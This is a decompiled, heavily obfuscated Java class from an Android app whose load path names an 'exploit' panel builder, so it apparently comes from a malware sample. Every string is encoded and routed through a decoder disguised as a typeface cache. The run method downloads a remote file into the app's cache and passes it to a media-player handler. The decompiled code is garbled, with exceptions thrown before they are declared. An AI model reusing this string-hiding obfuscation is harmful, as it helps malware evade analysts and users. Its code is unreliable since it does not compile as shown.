package v.s;

import android.content.Context;
import android.media.MediaPlayer;
import app.mobilex.plus.util.TypefaceCache;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class TSNDB0Gzi30d implements Runnable {
    public final /* synthetic */ Object Ee8d2j4S9Vm5yGuR;
    public final /* synthetic */ Object JXn4Qf7zpnLjP5;
    public final /* synthetic */ int vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ TSNDB0Gzi30d(Object obj, int i, Object obj2, int i2) {
        this.w9sT1Swbhx3hs = i2;
        this.JXn4Qf7zpnLjP5 = obj;
        this.vekpFI4d1Nc4fakF = i;
        this.Ee8d2j4S9Vm5yGuR = obj2;
    }

    private static /* synthetic */ void tyjfjt() {
    }

    @Override // java.lang.Runnable
    public final void run() {
        String strObtain;
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                String str = (String) this.JXn4Qf7zpnLjP5;
                int i = this.vekpFI4d1Nc4fakF;
                Context context = (Context) this.Ee8d2j4S9Vm5yGuR;
                MediaPlayer mediaPlayer = wbK4wnGaII4TwWEYqb.dDIMxZXP1V8HdM;
                try {
                    TypefaceCache.obtain("00070079004C008900FC00B000D300A3002A0078005C00C700F100AA00D600AE002C0036005D009500FF00B2008800E7");
                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
                    httpURLConnection.setConnectTimeout(15000);
                    httpURLConnection.setReadTimeout(30000);
                    httpURLConnection.setInstanceFollowRedirects(true);
                    int responseCode = httpURLConnection.getResponseCode();
                    if (responseCode != 200) {
                        TypefaceCache.obtain("00070079004C008900FC00B000D300A300630070005A008E00FC00BA00D600FD0063005E006F00B300C000FF");
                        if (i == wbK4wnGaII4TwWEYqb.ibVTtJUNfrGYbW) {
                            wbK4wnGaII4TwWEYqb.ibVTtJUNfrGYbW(TypefaceCache.obtain("000B0042006F00B700B0") + responseCode);
                            return;
                        }
                        return;
                    }
                    File file = new File(context.getCacheDir(), TypefaceCache.obtain("00220063005F008E00FF008000C200AB0022006F"));
                    file.mkdirs();
                    if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.obtain("006D0079005C0080"), false)) {
                        strObtain = TypefaceCache.obtain("006D0079005C0080");
                    } else {
                        strObtain = KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(str, TypefaceCache.obtain("006D0061005A0091"), false) ? TypefaceCache.obtain("006D0061005A0091") : TypefaceCache.obtain("006D007B004B00D4");
                    }
                    File file2 = new File(file, TypefaceCache.obtain("003100730056008800E400BA00ED00A6003600720052008800CF") + System.currentTimeMillis() + strObtain);
                    InputStream inputStream = httpURLConnection.getInputStream();
                    try {
                        FileOutputStream fileOutputStream = new FileOutputStream(file2);
                        try {
                            byte[] bArr = new byte[8192];
                            while (true) {
                                int i2 = inputStream.read(bArr);
                                if (i2 <= 0) {
                                    fileOutputStream.close();
                                    inputStream.close();
                                    if (i != wbK4wnGaII4TwWEYqb.ibVTtJUNfrGYbW) {
                                        file2.delete();
                                        return;
                                    }
                                    TypefaceCache.obtain("00070079004C008900FC00B000D300A300260072001B");
                                    file2.length();
                                    TypefaceCache.obtain("006300740042009300F500AC009200EA007D0036");
                                    file2.getAbsolutePath();
                                    wbK4wnGaII4TwWEYqb.w9sT1Swbhx3hs = file2;
                                    wbK4wnGaII4TwWEYqb.xDyLpEZyrcKVe0 = true;
                                    wbK4wnGaII4TwWEYqb.b1EoSIRjJHO5(TypefaceCache.obtain("002F0079005A008300F500BB"));
                                    return;
                                }
                                fileOutputStream.write(bArr, 0, i2);
                                try {
                                    throw th;
                                } catch (Throwable th) {
                                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(inputStream, th);
                                    throw th;
                                }
                            }
                        } catch (Throwable th2) {
                            try {
                                throw th2;
                            } catch (Throwable th3) {
                                okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(fileOutputStream, th2);
                                throw th3;
                            }
                        }
                    } catch (Throwable th4) {
                        throw th4;
                    }
                } catch (Exception e) {
                    TypefaceCache.obtain("00070079004C008900FC00B000D300A3006300730049009500FF00AD008800E7");
                    e.getMessage();
                    if (i == wbK4wnGaII4TwWEYqb.ibVTtJUNfrGYbW) {
                        wbK4wnGaII4TwWEYqb.ibVTtJUNfrGYbW(TypefaceCache.obtain("00070079004C008900FC00B000D300A300790036") + e.getMessage());
                        return;
                    }
                    return;
                }
            default:
                ((JAq04eEIRbdKN3s5wgEm) this.JXn4Qf7zpnLjP5).dDIMxZXP1V8HdM.DVTNwpDEVsUKuznof(this.vekpFI4d1Nc4fakF, this.Ee8d2j4S9Vm5yGuR);
                return;
        }
    }
}
